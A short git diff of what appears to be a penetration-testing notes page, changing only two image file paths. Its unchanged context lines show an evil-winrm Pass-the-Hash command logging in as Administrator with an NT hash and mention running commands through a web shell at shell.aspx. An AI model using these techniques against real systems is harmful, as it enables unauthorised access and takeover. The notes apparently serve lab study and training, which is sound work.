@@ -101,7 +101,7 @@ And finally, perform Pass-the-Hash to connect to the victim machine with Adminis
 evil-winrm -i $VICTIM -u Administrator -H f3118544a831e728781d780cfdb9c1fa
 ```
 
-<figure><img src="../../.gitbook/assets/image (95).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (95) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Special Privileges and Security Descriptors
 
@@ -856,7 +856,7 @@ We can then run commands from the web server by pointing to the following URL:
 
 `http://$VICTIM/shell.aspx`
 
-<figure><img src="../../.gitbook/assets/image (97).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (97) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
